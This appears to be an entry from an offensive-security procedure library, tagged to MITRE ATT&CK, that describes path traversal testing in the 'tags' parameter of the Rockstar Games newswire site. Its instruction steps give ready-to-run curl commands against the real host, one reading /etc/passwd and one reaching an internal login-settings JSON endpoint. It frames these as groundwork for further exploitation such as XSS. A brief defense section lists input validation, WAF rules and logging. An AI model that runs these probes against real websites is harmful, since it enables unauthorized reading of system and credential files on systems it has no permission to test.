---
tags:
  - path-traversal
  - web
  - discovery
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-test-tags-traversal]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-13T23:52:21.085Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: c73fac76-3f7b-4155-8dcf-e82ba53379d7
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Test-Path-Traversal-in-Tags-Parameter

## Summary

This procedure tests for path traversal vulnerabilities in the 'tags' parameter of the Rockstar Games newswire, allowing access to internal files or endpoints by bypassing directory restrictions with sequences like '../../'.

## Description

In the context of the Rockstar Newswire application, the 'tags' parameter in the URL (e.g., /newswire/tags?tags=value) is insufficiently sanitized, permitting directory traversal attacks. Attackers can append traversal payloads to reach sensitive internal paths, such as configuration files or API endpoints. This is a precursor to more severe exploits like XSS when combined with JSONP responses. Prerequisites include access to a browser or curl for testing, and the target must be a vulnerable web application like the Rockstar site circa 2015.

## Requirements

1. Network access to http://www.rockstargames.com/newswire
2. Tools like curl or a browser for sending requests
3. Basic understanding of URL encoding for payloads

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization on URL parameters to block traversal sequences (e.g., using whitelisting)
- Use web application firewalls (WAF) to detect and block '../' patterns in queries
- Log and monitor anomalous requests to internal paths

## Objectives

1. Confirm path traversal vulnerability in the tags parameter
2. Identify accessible internal endpoints for further exploitation
3. Gather evidence of insufficient sanitization for reporting

## Instructions

### Step 1: Probe Basic Traversal

**Context**: Send a request with a simple traversal payload to check if the server processes '../' sequences without blocking.

**Command** ([[commands/curl-test-tags-traversal]]):
```bash
curl "http://www.rockstargames.com/newswire/tags?tags=../../etc/passwd" -v
```

> This command attempts to access /etc/passwd via traversal. Expected output includes a response body or headers revealing internal path processing; success if no 403/400 block and partial file content or errors mention internal dirs.

### Step 2: Test for Internal Endpoint Access

**Context**: Escalate to targeting specific internal paths like API endpoints to confirm broader traversal capability.

**Command** ([[commands/curl-test-tags-traversal]]):
```bash
curl "http://www.rockstargames.com/newswire/tags?tags=../../comments_dal/users/getGlobalLoginSettings.json" -v
```

> Look for JSON response or endpoint data in the output, indicating successful traversal to non-public areas.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-test-tags-traversal]]

## Tools Used

- [[tools/curl]]

## Tags

- path-traversal
- web-discovery
